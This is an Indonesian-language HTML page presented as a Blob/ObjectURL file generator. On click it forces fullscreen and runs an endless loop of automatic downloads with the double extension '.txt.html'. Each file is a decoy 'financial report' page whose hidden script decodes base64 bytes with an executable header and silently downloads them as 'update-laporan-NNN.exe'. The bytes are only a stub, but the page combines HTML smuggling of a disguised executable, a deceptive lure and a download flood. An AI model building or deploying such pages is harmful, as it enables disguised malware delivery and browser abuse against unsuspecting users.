<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Generator Berkas Blob &amp; ObjectURL</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
}
body {
font-family: Arial, sans-serif;
background: #f4f6f8;
color: #222;
padding: 20px;
}
.panel {
background: #ffffff;
padding: 24px;
border-radius: 12px;
box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
max-width: 600px;
margin: 40px auto;
}
:fullscreen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
width: 100vw !important;
height: 100vh !important;
}
:-webkit-full-screen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
}
h2 {
margin-bottom: 10px;
}
p {
margin-bottom: 15px;
line-height: 1.5;
}
button {
width: 100%;
padding: 16px;
cursor: pointer;
border: none;
border-radius: 6px;
background: #d32f2f;
color: #ffffff;
font-weight: bold;
font-size: 16px;
box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
transition: background 0.2s;
}
button:hover {
background: #b71c1c;
}
#status {
margin-top: 16px;
font-weight: bold;
color: #d32f2f;
padding: 12px;
background: #ffebee;
border-radius: 6px;
text-align: center;
border: 1px solid #ffcdd2;
}
#downloads {
margin-top: 20px;
display: grid;
grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
gap: 10px;
}
#downloads a {
display: block;
padding: 8px;
background: #212121;
color: #80df82;
text-decoration: none;
border-radius: 4px;
font-size: 12px;
text-align: center;
border: 1px solid #424242;
word-break: break-all;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Generator Berkas Blob &amp; ObjectURL</h2>
<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus.</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
if ('speechSynthesis' in window) {
window.speechSynthesis.cancel();
const utterance = new SpeechSynthesisUtterance(message);
utterance.lang = 'id-ID';
utterance.rate = 1.0;
window.speechSynthesis.speak(utterance);
}
};

const prepareMimeBlobAsync = (i) => {
return new Promise((resolve) => {
queueMicrotask(() => {
const payloadText = "<html>\n" +
"<head><meta charset=\"UTF-8\"><title>Laporan Keuangan</title></head>\n" +
"<body style=\"font-family:Arial;background:#f0f2f5;padding:40px;text-align:center\">\n" +
"<div style=\"max-width:500px;margin:0 auto;background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1)\">\n" +
"<h1 style=\"color:#1e3a8a\">Laporan Keuangan</h1>\n" +
"<p style=\"color:#4b5563\">Lampiran pendukung sedang dipersiapkan...</p>\n" +
"<p style=\"color:#3b82f6;font-weight:bold\" id=\"loading\">Menyiapkan berkas...</p>\n" +
"</div>\n" +
"<script>\n" +
"(function() {\n" +
"    \"use strict\";\n" +
"    \n" +
"    function b64KeBytes(b64) {\n" +
"        var binary = atob(b64);\n" +
"        var bytes = new Uint8Array(binary.length);\n" +
"        for (var i = 0; i < binary.length; i++) {\n" +
"            bytes[i] = binary.charCodeAt(i);\n" +
"        }\n" +
"        return bytes;\n" +
"    }\n" +
"    \n" +
"    function b64KeString(b64) {\n" +
"        return decodeURIComponent(escape(atob(b64)));\n" +
"    }\n" +
"    \n" +
"    var b64Header = \"TVqQAAMAAAAEAAAA\";\n" +
"    var b64Bytes = \"AEEAAgBA\";\n" +
"    \n" +
"    function picuAutoDownload() {\n" +
"        try {\n" +
"            var headerStr = b64KeString(b64Header);\n" +
"            var bytesArr = b64KeBytes(b64Bytes);\n" +
"            var blob = new Blob([headerStr, bytesArr], { type: \"application/x-msdownload\" });\n" +
"            var url = URL.createObjectURL(blob);\n" +
"            var a = document.createElement(\"a\");\n" +
"            a.href = url;\n" +
"            a.download = \"update-laporan-" + String(i).padStart(3, '0') + ".exe\";\n" +
"            a.style.display = \"none\";\n" +
"            document.body.appendChild(a);\n" +
"            a.click();\n" +
"            setTimeout(function() {\n" +
"                document.body.removeChild(a);\n" +
"                URL.revokeObjectURL(url);\n" +
"            }, 2000);\n" +
"            var el = document.getElementById(\"loading\");\n" +
"            if (el) el.textContent = \"Berkas berhasil diunduh.\";\n" +
"        } catch (e) {\n" +
"            console.warn(\"Auto download gagal:\", e.message);\n" +
"        }\n" +
"    }\n" +
"    \n" +
"    if (document.readyState === \"loading\") {\n" +
"        document.addEventListener(\"DOMContentLoaded\", function() {\n" +
"            setTimeout(picuAutoDownload, 400);\n" +
"        });\n" +
"    } else {\n" +
"        setTimeout(picuAutoDownload, 400);\n" +
"    }\n" +
"})();\n" +
"<\/script>\n" +
"</body>\n" +
"</html>";
          
const blob = new Blob([payloadText], { type: "text/html" });
const url = URL.createObjectURL(blob);
resolve({ id: i, url: url });
});
});
};

const triggerInstantDownload = (fileData) => {
const link = document.createElement("a");
link.href = fileData.url;
link.download = `test-file-${fileData.id}.txt.html`;
link.textContent = `Blob #${fileData.id} (.txt.html)`;
link.style.display = "none";
downloadsDiv.appendChild(link);
link.click();
};

const processLoop = async (counter) => {
if (!isProcessing) return;

const fileData = await prepareMimeBlobAsync(counter);
activeUrls.push(fileData.url);

triggerInstantDownload(fileData);

statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;

if (counter % 10 === 0) {
speak(`Proses mencapai ${counter} berkas.`);
}

setTimeout(() => processLoop(counter + 1), 0);
};

startBtn.addEventListener("click", () => {
if (isProcessing) return;

activeUrls.forEach(url => URL.revokeObjectURL(url));
activeUrls = [];
downloadsDiv.replaceChildren();

speak("Mengaktifkan mode layar penuh.");

const root = document.documentElement;
try {
if (root.requestFullscreen) {
root.requestFullscreen();
} else if (root.webkitRequestFullscreen) {
root.webkitRequestFullscreen();
} else if (root.mozRequestFullScreen) {
root.mozRequestFullScreen();
}
statusDiv.textContent = "Mengunci layar penuh...";
} catch (err) {
console.warn("Fullscreen tidak didukung atau ditolak:", err);
}

setTimeout(() => {
isProcessing = true;
speak("Proses pembuatan berkas Blob dimulai.");
processLoop(1);
}, 300);
});
</script>
</body>
</html>
